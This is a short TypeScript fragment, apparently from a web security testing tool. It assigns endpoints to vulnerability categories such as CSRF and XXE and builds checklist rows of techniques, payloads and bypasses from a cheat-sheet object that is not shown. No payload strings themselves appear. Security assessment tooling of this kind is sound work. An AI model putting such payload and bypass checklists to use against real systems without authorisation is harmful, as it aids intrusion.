  // State-changing endpoints → CSRF.
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(m) && ep.hasBody) cats.add('cors-csrf');

  // XML bodies → XXE only when the traffic actually used XML.
  if (ep.hasBody && ct.includes('xml')) cats.add('xxe');

  return CATEGORY_ORDER.filter(c => cats.has(c));
}

/** One payload row for a checklist item — flat helper. */
export function cheatItemsForCategories(cats: CheatCategory[]): Array<{
  category: CheatCategory; technique: string; description: string; payload: string; bypass: string[];
}> {
  const out: Array<{ category: CheatCategory; technique: string; description: string; payload: string; bypass: string[] }> = [];
  for (const cat of cats) {
    for (const item of CHEATSHEET[cat].items) {
      const primary = item.payloads[0] || '';
      out.push({
        category: cat,
        technique: item.technique,
        description: item.description,
        payload: primary,
        bypass: item.bypass,
      });
    }
  }
  return out;
}
